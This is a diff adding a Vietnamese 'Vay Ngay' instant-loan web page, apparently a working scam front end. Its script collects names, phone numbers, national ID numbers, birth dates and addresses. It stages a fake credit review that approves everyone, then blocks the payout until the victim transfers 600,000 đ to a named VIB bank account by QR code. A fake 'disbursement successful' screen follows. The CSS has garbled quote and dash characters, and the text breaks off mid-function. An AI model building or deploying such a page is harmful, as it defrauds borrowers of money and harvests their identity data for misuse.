@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vay Ngay - Vay Tiền Nhanh 24/7</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Be+Vietnam+Pro:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #E8192C;
+    --red-dark: #B8001F;
+    --red-glow: rgba(232,25,44,0.3);
+    --gold: #F5A623;
+    --dark: #0A0A0F;
+    --dark2: #12121A;
+    --dark3: #1A1A28;
+    --card: #1E1E2E;
+    --border: rgba(255,255,255,0.08);
+    --text: #F0F0F5;
+    --muted: rgba(240,240,245,0.5);
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Be Vietnam Pro', sans-serif;
+    background: var(--dark);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+/* BG GRID */
+body::before {
+content:’’;
+position:fixed;
+inset:0;
+background-image:
+linear-gradient(rgba(232,25,44,0.03) 1px, transparent 1px),
+linear-gradient(90deg, rgba(232,25,44,0.03) 1px, transparent 1px);
+background-size: 40px 40px;
+pointer-events:none;
+z-index:0;
+}
+
+/* HEADER */
+header {
+position: fixed;
+top: 0; left: 0; right: 0;
+z-index: 100;
+padding: 16px 32px;
+display: flex;
+align-items: center;
+justify-content: space-between;
+background: rgba(10,10,15,0.85);
+backdrop-filter: blur(20px);
+border-bottom: 1px solid var(–border);
+}
+.logo {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 32px;
+letter-spacing: 3px;
+background: linear-gradient(135deg, var(–red), var(–gold));
+-webkit-background-clip: text;
+-webkit-text-fill-color: transparent;
+}
+.logo span { color: var(–gold); }
+.header-badge {
+background: var(–red);
+color: white;
+font-size: 11px;
+font-weight: 700;
+padding: 4px 12px;
+border-radius: 20px;
+letter-spacing: 1px;
+animation: pulse-badge 2s infinite;
+}
+@keyframes pulse-badge {
+0%,100% { box-shadow: 0 0 0 0 var(–red-glow); }
+50% { box-shadow: 0 0 0 8px transparent; }
+}
+
+/* SCREENS */
+.screen { display: none; min-height: 100vh; padding: 100px 24px 60px; position: relative; z-index: 1; }
+.screen.active { display: flex; flex-direction: column; align-items: center; }
+
+/* HERO */
+#screen-home .hero {
+text-align: center;
+margin-bottom: 48px;
+animation: fadeUp 0.8s ease both;
+}
+.hero-tag {
+display: inline-block;
+background: rgba(232,25,44,0.15);
+border: 1px solid rgba(232,25,44,0.4);
+color: var(–red);
+font-size: 12px;
+font-weight: 700;
+letter-spacing: 2px;
+padding: 6px 16px;
+border-radius: 20px;
+margin-bottom: 20px;
+text-transform: uppercase;
+}
+.hero h1 {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: clamp(52px, 10vw, 96px);
+line-height: 0.95;
+letter-spacing: 2px;
+margin-bottom: 20px;
+}
+.hero h1 .line-red { color: var(–red); display: block; }
+.hero h1 .line-gold {
+background: linear-gradient(135deg, var(–gold), #FFC85A);
+-webkit-background-clip: text;
+-webkit-text-fill-color: transparent;
+display: block;
+}
+.hero p {
+font-size: 16px;
+color: var(–muted);
+max-width: 440px;
+margin: 0 auto;
+line-height: 1.7;
+}
+
+/* STATS */
+.stats-row {
+display: flex;
+gap: 16px;
+margin-bottom: 48px;
+flex-wrap: wrap;
+justify-content: center;
+animation: fadeUp 0.8s 0.15s ease both;
+}
+.stat-card {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 16px;
+padding: 20px 28px;
+text-align: center;
+min-width: 130px;
+}
+.stat-val {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 36px;
+color: var(–gold);
+display: block;
+}
+.stat-lbl { font-size: 12px; color: var(–muted); }
+
+/* FORM CARD */
+.form-card {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 24px;
+padding: 40px;
+width: 100%;
+max-width: 520px;
+animation: fadeUp 0.8s 0.3s ease both;
+position: relative;
+overflow: hidden;
+}
+.form-card::before {
+content:’’;
+position: absolute;
+top: -60px; right: -60px;
+width: 180px; height: 180px;
+background: radial-gradient(circle, rgba(232,25,44,0.15), transparent 70%);
+pointer-events: none;
+}
+.form-card h2 {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 28px;
+letter-spacing: 2px;
+margin-bottom: 8px;
+color: var(–text);
+}
+.form-card p.sub { font-size: 13px; color: var(–muted); margin-bottom: 28px; }
+
+.form-group { margin-bottom: 20px; }
+.form-group label {
+display: block;
+font-size: 12px;
+font-weight: 700;
+letter-spacing: 1px;
+text-transform: uppercase;
+color: var(–muted);
+margin-bottom: 8px;
+}
+.form-group input, .form-group select {
+width: 100%;
+background: rgba(255,255,255,0.05);
+border: 1px solid var(–border);
+border-radius: 12px;
+padding: 14px 16px;
+color: var(–text);
+font-family: ‘Be Vietnam Pro’, sans-serif;
+font-size: 15px;
+outline: none;
+transition: all 0.2s;
+}
+.form-group input:focus, .form-group select:focus {
+border-color: var(–red);
+background: rgba(232,25,44,0.05);
+box-shadow: 0 0 0 3px rgba(232,25,44,0.1);
+}
+.form-group select option { background: var(–dark2); }
+
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+
+.btn-primary {
+width: 100%;
+background: linear-gradient(135deg, var(–red), var(–red-dark));
+color: white;
+border: none;
+border-radius: 14px;
+padding: 16px;
+font-family: ‘Be Vietnam Pro’, sans-serif;
+font-size: 16px;
+font-weight: 700;
+cursor: pointer;
+letter-spacing: 0.5px;
+transition: all 0.2s;
+position: relative;
+overflow: hidden;
+margin-top: 8px;
+}
+.btn-primary::after {
+content:’’;
+position: absolute;
+top: 0; left: -100%;
+width: 100%; height: 100%;
+background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+transition: left 0.4s;
+}
+.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px var(–red-glow); }
+.btn-primary:hover::after { left: 100%; }
+.btn-primary:active { transform: translateY(0); }
+
+.trust-row {
+display: flex;
+gap: 20px;
+justify-content: center;
+margin-top: 20px;
+flex-wrap: wrap;
+}
+.trust-item {
+display: flex;
+align-items: center;
+gap: 6px;
+font-size: 12px;
+color: var(–muted);
+}
+.trust-item .dot {
+width: 6px; height: 6px;
+background: #22C55E;
+border-radius: 50%;
+flex-shrink: 0;
+}
+
+/* REVIEW SCREEN */
+#screen-review {
+justify-content: center;
+align-items: center;
+}
+.review-box {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 28px;
+padding: 52px 40px;
+text-align: center;
+max-width: 420px;
+width: 100%;
+position: relative;
+overflow: hidden;
+}
+.review-box::before {
+content:’’;
+position: absolute;
+inset:0;
+background: radial-gradient(ellipse at 50% 0%, rgba(232,25,44,0.08), transparent 60%);
+}
+
+/* Spinner */
+.spinner-ring {
+width: 80px; height: 80px;
+border-radius: 50%;
+border: 3px solid rgba(255,255,255,0.08);
+border-top-color: var(–red);
+animation: spin 1s linear infinite;
+margin: 0 auto 28px;
+position: relative;
+z-index:1;
+}
+.spinner-ring::after {
+content:’’;
+position: absolute;
+inset: 6px;
+border-radius: 50%;
+border: 3px solid rgba(255,255,255,0.04);
+border-top-color: var(–gold);
+animation: spin 1.5s linear infinite reverse;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Steps list */
+.check-steps {
+list-style: none;
+text-align: left;
+margin: 28px 0;
+position: relative;
+z-index:1;
+}
+.check-steps li {
+display: flex;
+align-items: center;
+gap: 14px;
+padding: 12px 0;
+border-bottom: 1px solid var(–border);
+font-size: 14px;
+color: var(–muted);
+transition: color 0.4s;
+}
+.check-steps li:last-child { border-bottom: none; }
+.check-steps li.done { color: var(–text); }
+.step-icon {
+width: 28px; height: 28px;
+border-radius: 50%;
+border: 2px solid rgba(255,255,255,0.1);
+display: flex; align-items: center; justify-content: center;
+font-size: 13px;
+flex-shrink: 0;
+transition: all 0.4s;
+position: relative;
+overflow: hidden;
+}
+.step-icon .pending { opacity: 1; transition: opacity 0.3s; }
+.step-icon .check {
+position: absolute;
+opacity: 0;
+color: white;
+font-size: 14px;
+transition: opacity 0.3s;
+}
+.check-steps li.done .step-icon {
+background: #22C55E;
+border-color: #22C55E;
+}
+.check-steps li.done .step-icon .pending { opacity: 0; }
+.check-steps li.done .step-icon .check { opacity: 1; }
+
+/* RESULT SCREEN */
+#screen-result {
+justify-content: center;
+align-items: center;
+}
+.result-box {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 28px;
+padding: 48px 40px;
+text-align: center;
+max-width: 440px;
+width: 100%;
+animation: popIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+position: relative;
+overflow: hidden;
+}
+@keyframes popIn {
+from { opacity: 0; transform: scale(0.8); }
+to { opacity: 1; transform: scale(1); }
+}
+.result-box::before {
+content:’’;
+position: absolute;
+inset: 0;
+background: radial-gradient(ellipse at 50% 0%, rgba(34,197,94,0.08), transparent 60%);
+}
+.approved-icon {
+width: 80px; height: 80px;
+background: linear-gradient(135deg, #22C55E, #16A34A);
+border-radius: 50%;
+display: flex; align-items: center; justify-content: center;
+font-size: 36px;
+margin: 0 auto 24px;
+position: relative;
+z-index: 1;
+animation: bounceIn 0.6s 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+box-shadow: 0 0 40px rgba(34,197,94,0.4);
+}
+@keyframes bounceIn {
+from { transform: scale(0); opacity: 0; }
+to { transform: scale(1); opacity: 1; }
+}
+.result-box h2 {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 30px;
+letter-spacing: 2px;
+color: #22C55E;
+margin-bottom: 8px;
+position: relative; z-index: 1;
+}
+.result-box .sub-text { font-size: 14px; color: var(–muted); margin-bottom: 28px; position: relative; z-index: 1; }
+
+.limit-display {
+background: rgba(245,166,35,0.1);
+border: 1px solid rgba(245,166,35,0.3);
+border-radius: 16px;
+padding: 20px;
+margin-bottom: 24px;
+position: relative; z-index: 1;
+}
+.limit-label { font-size: 12px; color: var(–muted); letter-spacing: 1px; text-transform: uppercase; }
+.limit-val {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 48px;
+color: var(–gold);
+line-height: 1;
+margin: 4px 0;
+}
+.limit-sub { font-size: 12px; color: var(–muted); }
+
+.result-info {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+margin-bottom: 28px;
+position: relative; z-index: 1;
+}
+.info-item {
+background: rgba(255,255,255,0.04);
+border-radius: 12px;
+padding: 14px;
+text-align: left;
+}
+.info-item .lbl { font-size: 11px; color: var(–muted); margin-bottom: 4px; }
+.info-item .val { font-size: 14px; font-weight: 600; }
+
+.btn-disburse {
+width: 100%;
+padding: 16px;
+border-radius: 14px;
+border: none;
+font-family: ‘Be Vietnam Pro’, sans-serif;
+font-size: 16px;
+font-weight: 700;
+cursor: pointer;
+transition: all 0.2s;
+position: relative; z-index: 1;
+}
+.btn-disburse.locked {
+background: rgba(255,255,255,0.06);
+color: var(–muted);
+cursor: not-allowed;
+}
+.lock-notice {
+margin-top: 14px;
+background: rgba(245,166,35,0.1);
+border: 1px solid rgba(245,166,35,0.25);
+border-radius: 12px;
+padding: 14px 16px;
+font-size: 13px;
+color: var(–gold);
+position: relative; z-index: 1;
+line-height: 1.6;
+}
+.lock-notice strong { display: block; margin-bottom: 4px; }
+.lock-notice .amount-required { font-size: 20px; font-weight: 800; color: var(–red); }
+
+.btn-pay-now {
+width: 100%;
+margin-top: 14px;
+background: linear-gradient(135deg, var(–gold), #E8901A);
+color: #0A0A0F;
+border: none;
+border-radius: 14px;
+padding: 15px;
+font-family: ‘Be Vietnam Pro’, sans-serif;
+font-size: 15px;
+font-weight: 800;
+cursor: pointer;
+transition: all 0.2s;
+letter-spacing: 0.3px;
+position: relative; z-index: 1;
+}
+.btn-pay-now:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(245,166,35,0.4); }
+
+/* PAYMENT SCREEN */
+#screen-payment {
+justify-content: center;
+align-items: center;
+}
+.payment-box {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 28px;
+padding: 40px;
+max-width: 440px;
+width: 100%;
+text-align: center;
+animation: fadeUp 0.5s ease both;
+}
+.payment-box h2 {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 28px;
+letter-spacing: 2px;
+margin-bottom: 6px;
+}
+.payment-box .sub { font-size: 13px; color: var(–muted); margin-bottom: 28px; }
+
+.qr-wrap {
+background: white;
+border-radius: 20px;
+padding: 16px;
+display: inline-block;
+margin-bottom: 20px;
+box-shadow: 0 0 40px rgba(232,25,44,0.2);
+}
+.qr-wrap img { width: 220px; height: 220px; display: block; border-radius: 8px; }
+
+.pay-amount {
+background: rgba(232,25,44,0.1);
+border: 1px solid rgba(232,25,44,0.3);
+border-radius: 14px;
+padding: 16px;
+margin-bottom: 20px;
+}
+.pay-amount .lbl { font-size: 12px; color: var(–muted); margin-bottom: 4px; }
+.pay-amount .val {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 40px;
+color: var(–red);
+}
+
+.pay-info {
+background: rgba(255,255,255,0.04);
+border-radius: 12px;
+padding: 14px 16px;
+text-align: left;
+margin-bottom: 20px;
+font-size: 13px;
+line-height: 1.8;
+color: var(–muted);
+}
+.pay-info b { color: var(–text); }
+
+.btn-paid {
+width: 100%;
+background: linear-gradient(135deg, #22C55E, #16A34A);
+color: white;
+border: none;
+border-radius: 14px;
+padding: 16px;
+font-family: ‘Be Vietnam Pro’, sans-serif;
+font-size: 16px;
+font-weight: 700;
+cursor: pointer;
+transition: all 0.2s;
+letter-spacing: 0.3px;
+}
+.btn-paid:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(34,197,94,0.4); }
+
+/* SUCCESS SCREEN */
+#screen-success {
+justify-content: center;
+align-items: center;
+}
+.success-box {
+background: var(–card);
+border: 1px solid var(–border);
+border-radius: 28px;
+padding: 48px 40px;
+text-align: center;
+max-width: 440px;
+width: 100%;
+animation: popIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+position: relative;
+overflow: hidden;
+}
+.success-box::before {
+content:’’;
+position: absolute;
+inset: 0;
+background: radial-gradient(ellipse at 50% 0%, rgba(34,197,94,0.1), transparent 60%);
+}
+.confetti-line {
+position: absolute;
+top: 0; left: 0; right: 0;
+height: 4px;
+background: linear-gradient(90deg, var(–red), var(–gold), #22C55E, var(–red));
+background-size: 200%;
+animation: shimmer 2s linear infinite;
+}
+@keyframes shimmer { to { background-position: 200% center; } }
+
+.money-icon {
+font-size: 60px;
+margin-bottom: 16px;
+display: block;
+position: relative; z-index:1;
+animation: bounceIn 0.6s 0.2s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+}
+.success-box h2 {
+font-family: ‘Bebas Neue’, sans-serif;
+font-size: 34px;
+letter-spacing: 2px;
+color: #22C55E;
+margin-bottom: 8px;
+position: relative; z-index: 1;
+}
+.success-box .sub { font-size: 14px; color: var(–muted); margin-bottom: 28px; position: relative; z-index: 1; }
+
+.loan-summary {
+background: rgba(255,255,255,0.04);
+border-radius: 16px;
+padding: 20px;
+margin-bottom: 20px;
+text-align: left;
+position: relative; z-index: 1;
+}
+.loan-row {
+display: flex;
+justify-content: space-between;
+align-items: center;
+padding: 10px 0;
+border-bottom: 1px solid var(–border);
+font-size: 14px;
+}
+.loan-row:last-child { border-bottom: none; }
+.loan-row .k { color: var(–muted); }
+.loan-row .v { font-weight: 700; }
+.loan-row .v.red { color: var(–red); }
+.loan-row .v.green { color: #22C55E; }
+.loan-row .v.gold { color: var(–gold); }
+
+.warning-box {
+background: rgba(232,25,44,0.08);
+border: 1px solid rgba(232,25,44,0.25);
+border-radius: 12px;
+padding: 14px 16px;
+font-size: 13px;
+color: var(–red);
+line-height: 1.6;
+position: relative; z-index: 1;
+text-align: left;
+}
+.warning-box strong { display: block; margin-bottom: 4px; font-size: 14px; }
+
+@keyframes fadeUp {
+from { opacity: 0; transform: translateY(30px); }
+to { opacity: 1; transform: translateY(0); }
+}
+
+/* RESPONSIVE */
+@media(max-width: 480px) {
+header { padding: 14px 20px; }
+.logo { font-size: 26px; }
+.form-card { padding: 28px 20px; }
+.form-row { grid-template-columns: 1fr; }
+.result-box { padding: 36px 24px; }
+.payment-box { padding: 32px 20px; }
+.success-box { padding: 36px 24px; }
+.result-info { grid-template-columns: 1fr; }
+}
+
+/* FLOATING PARTICLES */
+.particles { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+.particle {
+position: absolute;
+width: 2px; height: 2px;
+background: var(–red);
+border-radius: 50%;
+opacity: 0;
+animation: float-particle linear infinite;
+}
+@keyframes float-particle {
+0% { transform: translateY(100vh) scale(0); opacity: 0; }
+10% { opacity: 0.6; }
+90% { opacity: 0.6; }
+100% { transform: translateY(-20px) scale(1); opacity: 0; }
+}
+</style>
+
+</head>
+<body>
+
+<div class="particles" id="particles"></div>
+
+<header>
+  <div class="logo">VAY<span>NGAY</span></div>
+  <div class="header-badge">● ĐANG HOẠT ĐỘNG</div>
+</header>
+
+<!-- SCREEN 1: HOME/FORM -->
+
+<div class="screen active" id="screen-home">
+  <div class="hero">
+    <div class="hero-tag">✦ Giải ngân trong 5 phút ✦</div>
+    <h1>
+      <span class="line-red">VAY NGAY</span>
+      <span class="line-gold">KHÔNG CẦN THẾ CHẤP</span>
+    </h1>
+    <p>Duyệt hồ sơ tự động 24/7 — nhận tiền nhanh chóng, thủ tục đơn giản, không cần gặp mặt.</p>
+  </div>
+
+  <div class="stats-row">
+    <div class="stat-card">
+      <span class="stat-val">50K+</span>
+      <span class="stat-lbl">Khách hàng</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-val">5'</span>
+      <span class="stat-lbl">Duyệt hồ sơ</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-val">24/7</span>
+      <span class="stat-lbl">Hỗ trợ</span>
+    </div>
+  </div>
+
+  <div class="form-card">
+    <h2>ĐĂNG KÝ VAY NGAY</h2>
+    <p class="sub">Điền thông tin bên dưới để nhận hạn mức vay ngay lập tức</p>
+
+```
+<div class="form-group">
+  <label>Họ và tên đầy đủ *</label>
+  <input type="text" id="inp-name" placeholder="Nguyễn Văn A">
+</div>
+
+<div class="form-row">
+  <div class="form-group">
+    <label>Số điện thoại *</label>
+    <input type="tel" id="inp-phone" placeholder="0987 654 321">
+  </div>
+  <div class="form-group">
+    <label>CCCD / CMND *</label>
+    <input type="text" id="inp-cccd" placeholder="012345678901">
+  </div>
+</div>
+
+<div class="form-row">
+  <div class="form-group">
+    <label>Ngày sinh *</label>
+    <input type="date" id="inp-dob">
+  </div>
+  <div class="form-group">
+    <label>Thu nhập / tháng *</label>
+    <select id="inp-income">
+      <option value="">-- Chọn --</option>
+      <option>Dưới 3 triệu</option>
+      <option>3 - 7 triệu</option>
+      <option>7 - 15 triệu</option>
+      <option>Trên 15 triệu</option>
+    </select>
+  </div>
+</div>
+
+<div class="form-group">
+  <label>Mục đích vay *</label>
+  <select id="inp-purpose">
+    <option value="">-- Chọn mục đích --</option>
+    <option>Chi tiêu cá nhân</option>
+    <option>Mua sắm / Tiêu dùng</option>
+    <option>Thanh toán hóa đơn</option>
+    <option>Kinh doanh nhỏ</option>
+    <option>Y tế / Khám chữa bệnh</option>
+    <option>Khác</option>
+  </select>
+</div>
+
+<div class="form-group">
+  <label>Địa chỉ thường trú *</label>
+  <input type="text" id="inp-address" placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/thành">
+</div>
+
+<button class="btn-primary" onclick="submitForm()">
+  🚀 &nbsp; GỬI ĐƠN ĐĂNG KÝ VAY
+</button>
+
+<div class="trust-row">
+  <div class="trust-item"><div class="dot"></div> Bảo mật SSL</div>
+  <div class="trust-item"><div class="dot"></div> Không phí ẩn</div>
+  <div class="trust-item"><div class="dot"></div> 100% online</div>
+</div>
+```
+
+  </div>
+</div>
+
+<!-- SCREEN 2: REVIEWING -->
+
+<div class="screen" id="screen-review">
+  <div class="review-box">
+    <div class="spinner-ring" id="review-spinner"></div>
+    <h2 style="font-family:'Bebas Neue',sans-serif;font-size:26px;letter-spacing:2px;margin-bottom:8px;position:relative;z-index:1;">ĐANG ĐÁNH GIÁ HỒ SƠ</h2>
+    <p style="font-size:13px;color:var(--muted);position:relative;z-index:1;" id="review-msg">Hệ thống đang phân tích thông tin của bạn...</p>
+
+```
+<ul class="check-steps" id="check-steps">
+  <li id="step1">
+    <div class="step-icon">
+      <span class="pending">○</span>
+      <span class="check">✓</span>
+    </div>
+    Xác minh thông tin cá nhân
+  </li>
+  <li id="step2">
+    <div class="step-icon">
+      <span class="pending">○</span>
+      <span class="check">✓</span>
+    </div>
+    Kiểm tra lịch sử tín dụng
+  </li>
+  <li id="step3">
+    <div class="step-icon">
+      <span class="pending">○</span>
+      <span class="check">✓</span>
+    </div>
+    Đánh giá khả năng thanh toán
+  </li>
+  <li id="step4">
+    <div class="step-icon">
+      <span class="pending">○</span>
+      <span class="check">✓</span>
+    </div>
+    Tính toán hạn mức phù hợp
+  </li>
+</ul>
+```
+
+  </div>
+</div>
+
+<!-- SCREEN 3: RESULT / LIMIT -->
+
+<div class="screen" id="screen-result">
+  <div class="result-box">
+    <div class="approved-icon">✓</div>
+    <h2>HỒ SƠ ĐƯỢC DUYỆT!</h2>
+    <p class="sub">Hồ sơ của bạn <strong style="color:#22C55E">khá tốt</strong> — Chúc mừng bạn đã được phê duyệt!</p>
+
+```
+<div class="limit-display">
+  <div class="limit-label">Hạn mức được duyệt</div>
+  <div class="limit-val">2.000.000 đ</div>
+  <div class="limit-sub">Vay nhanh — không thế chấp</div>
+</div>
+
+<div class="result-info">
+  <div class="info-item">
+    <div class="lbl">Thời hạn vay</div>
+    <div class="val">1 tháng</div>
+  </div>
+  <div class="info-item">
+    <div class="lbl">Tổng hoàn trả</div>
+    <div class="val" style="color:var(--red)">2.200.000 đ</div>
+  </div>
+  <div class="info-item">
+    <div class="lbl">Lãi suất</div>
+    <div class="val">Cố định</div>
+  </div>
+  <div class="info-item">
+    <div class="lbl">Trạng thái</div>
+    <div class="val" style="color:#22C55E">✓ Đã duyệt</div>
+  </div>
+</div>
+
+<button class="btn-disburse locked" onclick="showLockAlert()">
+  🔒 &nbsp; YÊU CẦU GIẢI NGÂN
+</button>
+
+<div class="lock-notice">
+  <strong>⚠️ Tài khoản bị khoá giải ngân</strong>
+  Bạn cần <b>chứng minh khả năng thanh toán</b> trước khi có thể nhận tiền.<br><br>
+  Số tiền cần chứng minh (30% khoản vay):<br>
+  <span class="amount-required">600.000 đ</span>
+</div>
+
+<button class="btn-pay-now" onclick="goPayment()">
+  💳 &nbsp; THANH TOÁN CHỨNG MINH NGAY
+</button>
+```
+
+  </div>
+</div>
+
+<!-- SCREEN 4: PAYMENT -->
+
+<div class="screen" id="screen-payment">
+  <div class="payment-box">
+    <h2>THANH TOÁN QR</h2>
+    <p class="sub">Quét mã QR bên dưới để chứng minh khả năng thanh toán</p>
+
+```
+<div class="qr-wrap">
+  <img id="qr-img" src="https://qr.sepay.vn/img?bank=VIB&acc=068394585&template=compact&amount=600000&des=chung+minh+kha+nang+thanh+toan+30%25" alt="QR Thanh toán">
+</div>
+
+<div class="pay-amount">
+  <div class="lbl">Số tiền cần chuyển</div>
+  <div class="val">600.000 đ</div>
+</div>
+
+<div class="pay-info">
+  <b>Ngân hàng:</b> VIB<br>
+  <b>Số tài khoản:</b> 068394585<br>
+  <b>Nội dung CK:</b> chung minh kha nang thanh toan 30%<br>
+  <b>Lưu ý:</b> Nhập đúng nội dung chuyển khoản để hệ thống xác nhận tự động
+</div>
+
+<button class="btn-paid" onclick="confirmPaid()">
+  ✅ &nbsp; TÔI ĐÃ THANH TOÁN — YÊU CẦU GIẢI NGÂN
+</button>
+```
+
+  </div>
+</div>
+
+<!-- SCREEN 5: SUCCESS -->
+
+<div class="screen" id="screen-success">
+  <div class="success-box">
+    <div class="confetti-line"></div>
+    <span class="money-icon">💰</span>
+    <h2>GIẢI NGÂN THÀNH CÔNG!</h2>
+    <p class="sub">Khoản vay <strong>2.000.000đ</strong> đã được giải ngân vào tài khoản của bạn</p>
+
+```
+<div class="loan-summary">
+  <div class="loan-row">
+    <span class="k">Số tiền giải ngân</span>
+    <span class="v green">2.000.000 đ</span>
+  </div>
+  <div class="loan-row">
+    <span class="k">Ngày giải ngân</span>
+    <span class="v" id="disburse-date">--</span>
+  </div>
+  <div class="loan-row">
+    <span class="k">Hạn trả nợ</span>
+    <span class="v red" id="due-date">--</span>
+  </div>
+  <div class="loan-row">
+    <span class="k">Số tiền gốc</span>
+    <span class="v">2.000.000 đ</span>
+  </div>
+  <div class="loan-row">
+    <span class="k">Lãi phát sinh</span>
+    <span class="v gold">+ 200.000 đ</span>
+  </div>
+  <div class="loan-row" style="padding-top:14px">
+    <span class="k" style="font-weight:700;color:var(--text)">Tổng phải trả</span>
+    <span class="v red" style="font-size:18px">2.200.000 đ</span>
+  </div>
+</div>
+
+<div class="warning-box">
+  <strong>⚠️ Lưu ý quan trọng</strong>
+  Vui lòng thanh toán đúng hạn để tránh phát sinh lãi phạt và ảnh hưởng điểm tín dụng. Liên hệ hotline nếu cần hỗ trợ.
+</div>
+```
+
+  </div>
+</div>
+
+<script>
+  // ── CONFIG ─────────────────────────────────────────────────
+  const API_BASE = window.location.origin; // same origin as server.js
+
+  // ── PARTICLES ──────────────────────────────────────────────
+  const pc = document.getElementById('particles');
+  for(let i=0; i<25; i++){
+    const p = document.createElement('div');
+    p.className = 'particle';
+    p.style.left = Math.random()*100+'%';
+    p.style.animationDuration = (8+Math.random()*12)+'s';
+    p.style.animationDelay = (Math.random()*10)+'s';
+    p.style.width = p.style.height = (1+Math.random()*2)+'px';
+    p.style.background = Math.random()>0.5 ? 'var(--red)' : 'var(--gold)';
+    pc.appendChild(p);
+  }
+
+  // ── STATE ──────────────────────────────────────────────────
+  let currentAppId = null;
+
+  // ── UI HELPERS ─────────────────────────────────────────────
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  function setLoading(btn, loading) {
+    btn.disabled = loading;
+    btn.style.opacity = loading ? '0.6' : '1';
+    btn.textContent = loading ? '⏳  Đang xử lý...' : btn._origText;
+  }
+
+  // ── SUBMIT FORM → POST /api/applications ───────────────────
+  async function submitForm() {
+    const name    = document.getElementById('inp-name').value.trim();
+    const phone   = document.getElementById('inp-phone').value.trim();
+    const cccd    = document.getElementById('inp-cccd').value.trim();
+    const dob     = document.getElementById('inp-dob').value;
+    const income  = document.getElementById('inp-income').value;
+    const purpose = document.getElementById('inp-purpose').value;
+    const address = document.getElementById('inp-address').value.trim();
+
+    if(!name||!phone||!cccd||!dob||!income||!purpose||!address){
+      alert('⚠️ Vui lòng điền đầy đủ tất cả thông tin bắt buộc!');
+      return;
+    }
+
+    const btn = document.querySelector('#screen-home .btn-primary');
+    btn._origText = btn.textContent;
+    setLoading(btn, true);
+
+    try {
+      const res = await fetch(`${API_BASE}/api/applications`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name, phone, cccd, dob, income, purpose, address }),
+      });
+      const json = await res.json();
+
+      if (!res.ok) {
+        alert('❌ ' + (json.message || 'Có lỗi xảy ra. Vui lòng thử lại.'));
+        setLoading(btn, false);
+        return;
+      }
+
+      currentAppId = json.data._id;
+      showScreen('screen-review');
+      runReviewAnimation(currentAppId);
+
+    } catch (err) {
+      console.error(err);
+      alert('❌ Không thể kết nối server. Vui lòng thử lại sau.');
+      setLoading(btn, false);
+    }
+  }
+
+  // ── REVIEW ANIMATION → PATCH status = approved ─────────────
+  function runReviewAnimation(appId) {
+    const steps = ['step1','step2','step3','step4'];
+    const msgs = [
+      'Đang xác minh thông tin cá nhân...',
+      'Đang kiểm tra lịch sử tín dụng...',
+      'Đang đánh giá khả năng thanh toán...',
+      'Đang tính toán hạn mức phù hợp...',
+      'Hồ sơ của bạn khá tốt! Đang hoàn tất...'
+    ];
+    let i = 0;
+    const msgEl = document.getElementById('review-msg');
+
+    function nextStep() {
+      if(i < steps.length) {
+        msgEl.textContent = msgs[i];
+        setTimeout(() => {
+          document.getElementById(steps[i]).classList.add('done');
+          i++;
+          setTimeout(nextStep, 900);
+        }, 1200);
+      } else {
+        msgEl.textContent = msgs[4];
+        document.getElementById('review-spinner').style.borderTopColor = '#22C55E';
+        // Update status to approved on server
+        fetch(`${API_BASE}/api/applications/${appId}/status`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ status: 'approved' }),
+        }).catch(err => console.warn('Status update failed:', err));
+
+        setTimeout(() => showScreen('screen-result'), 1500);
+      }
+    }
+    setTimeout(nextStep, 600);
+  }
+
+  // ── LOCK ALERT ─────────────────────────────────────────────
+  function showLockAlert() {
+    alert('🔒 Tài khoản bị khoá!\n\nBạn cần thanh toán 600.000đ (30% khoản vay) để chứng minh khả năng thanh toán trước khi yêu cầu giải ngân.');
+  }
+
+  function goPayment() {
+    // Mark as pending_payment
+    if(currentAppId) {
+      fetch(`${API_BASE}/api/applications/${currentAppId}/status`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status: 'pending_payment' }),
+      }).catch(e => console.warn(e));
+    }
+    showScreen('screen-payment');
+  }
+
+  // ── CONFIRM PAYMENT → POST /api/applications/:id/confirm-payment
+  async function confirmPaid() {
+    if(!currentAppId) {
+      alert('❌ Lỗi: Không tìm thấy đơn vay. Vui lòng đăng ký lại.');
+      return;
+    }
+
